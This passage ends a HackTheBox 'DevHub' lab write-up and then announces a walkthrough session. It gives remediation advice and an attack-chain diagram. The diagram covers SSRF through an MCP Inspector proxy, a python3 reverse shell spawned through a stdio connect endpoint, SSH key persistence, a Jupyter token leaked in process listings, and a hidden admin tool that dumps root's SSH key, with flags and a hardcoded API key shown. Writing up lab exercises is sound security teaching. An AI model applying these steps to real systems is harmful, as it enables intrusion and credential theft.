- Remove the `ops._admin_dump` tool entirely. Emergency credential recovery should use out-of-band mechanisms (physical console, IPMI, recovery boot) — never an HTTP API.
- Store the API key in an environment variable or secrets manager, not in source code.
- Run OPSMCP as a dedicated non-root service account with only the permissions needed for its visible tools.
- Implement audit logging for all tool calls, especially any that access sensitive resources.
- Restrict read access to `/opt/opsmcp/server.py` to root only (`chmod 700 /opt/opsmcp`, `chown root:root /opt/opsmcp/server.py`).

### 8.5 OPSMCP — Running as Root Without Necessity

**What it is:** The OPSMCP process (PID 1061) runs as root (`uid=0`), despite providing only read-only monitoring functionality.

**Why it is dangerous:** Root-owned processes have unrestricted filesystem access. Any vulnerability in the service — including the hidden admin tool — can directly read, modify, or delete any file on the system.

**Remediation:**
- Create a dedicated `opsmcp` service account with only the minimum permissions required for the visible tools (read access to `/proc` for system stats, controlled access to log files via group membership).
- Use `systemd` unit files with `User=opsmcp`, `CapabilityBoundingSet=`, and `NoNewPrivileges=true` to enforce the least-privilege execution context.
- Audit all other services for unnecessary root execution.

---

## Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         DEVHUB ATTACK CHAIN                         │
└─────────────────────────────────────────────────────────────────────┘

  ATTACKER (10.10.14.85)
       │
       │ [Phase 1] Reconnaissance
       ├─── nmap -p- ──────────────────────────► PORT 22 (SSH)
       │                                         PORT 80 (nginx → devhub.htb)
       │                                         PORT 6274 (MCPJam Inspector)
       │
       │ [Phase 2] Web Enumeration
       ├─── curl devhub.htb ──────────────────► Landing page reveals:
       │                                         • MCP Inspector @ 6274
       │                                         • Jupyter @ localhost:8888 (internal)
       │
       ├─── Download JS bundle ───────────────► grep for quoted paths
       │    (index-DRYhT9Xb.js, 4MB)             • /api/mcp/oauth/proxy  ◄── SSRF
       │                                          • /api/mcp/connect      ◄── RCE
       │
       │ [Phase 3] SSRF Recon
       ├─── POST /api/mcp/oauth/proxy ────────► Probe 127.0.0.1:8888
       │    {"url":"http://127.0.0.1:8888/api"}   └─ Jupyter 2.17.0 (TornadoServer)
       │
       ├─── POST /api/mcp/oauth/proxy ────────► Probe 127.0.0.1:5000
       │    {"url":"http://127.0.0.1:5000/"}       └─ OPSMCP 2.1.0 (Werkzeug/Flask)
       │                                              X-API-Key required
       │
       │ [Phase 4] RCE — Initial Foothold
       ├─── POST /api/mcp/connect ────────────► stdio transport
       │    {type:"stdio", command:"python3",    spawn python3 -c "reverse shell"
       │     args:["-c","<revshell>"]}
       │                                               │
       │◄──────── REVERSE SHELL ──────────────────────┘
       │          mcp-dev@devhub (uid=1001)
       │
       │ [Phase 5] Persistence
       ├─── inject SSH pubkey ────────────────► /home/mcp-dev/.ssh/authorized_keys
       ├─── ssh -i devhub_key mcp-dev@... ───► Stable SSH session
       │
       │ [Phase 6] Credential Leak
       ├─── ps aux ───────────────────────────► analyst PID 1055:
       │                                         --ServerApp.token=a7f3b2c9d8e1...
       │                                        root PID 1061:
       │                                         /opt/opsmcp/server.py (ROOT!)
       │
       │ [Phase 7] SSH Tunnels
       ├─── ssh -L 18888:127.0.0.1:8888 ─────► localhost:18888 → Jupyter
       ├─── ssh -L 15000:127.0.0.1:5000 ─────► localhost:15000 → OPSMCP
       │
       │ [Phase 8] Lateral Movement — analyst
       ├─── POST /api/kernels ────────────────► Create Python3 kernel
       │    Authorization: token a7f3b2c9...     ID: c5597c34-...
       │
       ├─── WebSocket /api/kernels/.../channels► Execute as analyst:
       │    execute_request (python code)         - read /home/analyst/user.txt
       │                                          - read /opt/opsmcp/server.py
       │
       │    ┌─── FROM server.py ────────────────────────────────────────┐
       │    │  VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"    │
       │    │  HIDDEN: ops._admin_dump (reads /root/.ssh/id_rsa)        │
       │    └───────────────────────────────────────────────────────────┘
       │
       │  USER FLAG: c442f5299f0ae6dee0346e40b279f5ae
       │
       │ [Phase 9] Privilege Escalation
       ├─── POST localhost:15000/tools/call ──► ops._admin_dump
       │    X-API-Key: opsmcp_secret_key_...     target=ssh_keys, confirm=true
       │    name: "ops._admin_dump"
       │                                          OPSMCP runs as ROOT →
       │                                          reads /root/.ssh/id_rsa
       │                                          returns key in JSON response
       │
       ├─── ssh -i root_id_rsa root@... ─────► ROOT SHELL
       │
       │  ROOT FLAG: ce91dcdb859f774e8f48b7a8512f528d
       │
       └─────────────────────────────────────────────────────────────────

  VULNERABILITY CHAIN:
  JS Bundle Mining → SSRF Discovery → stdio RCE → SSH Persistence
  → ps aux Token Leak → Jupyter Kernel Exec → Source Code Read
  → Hidden Tool Discovery → OPSMCP Admin Dump → Root SSH Key → pwned
```







This week, we are diving deep into DevHub, a Medium-difficulty machine straight out of HackTheBox Season 11. Whether you’ve already rooted it and want to see a different perspective, or you're stuck and need that breakthrough hint, this session is for you.

Bring your questions, bring your terminal, and let's collaborate, share methodologies, and learn from each other in real-time! 🚀

📅 Event & Machine Details

Session Lead: Terrence M.K
Where: bit.ly/shujaawalkthroughshttps://www.google.com/search?q=https://bit.ly/shujaawalkthroughs
Machine Name: DevHub
Platform: HackTheBox
HTB Season: Season 11
Difficulty: Medium
When: Wednesday, 10th Jun 2026
Target Link: https://app.hackthebox.com/machines/DevHubhttps://app.hackthebox.com/machines/DevHub

⚠️ Important Note Regarding Recordings

Please Note: To strictly respect HackTheBox rules regarding active season machines, this session will be recorded but the footage will not be posted publicly until DevHub is officially retired. Come hang out with us live to get the full walkthrough and participate in the Q&A!

See you all in the session. Let's hunt some shells! 🏴‍☠️🔥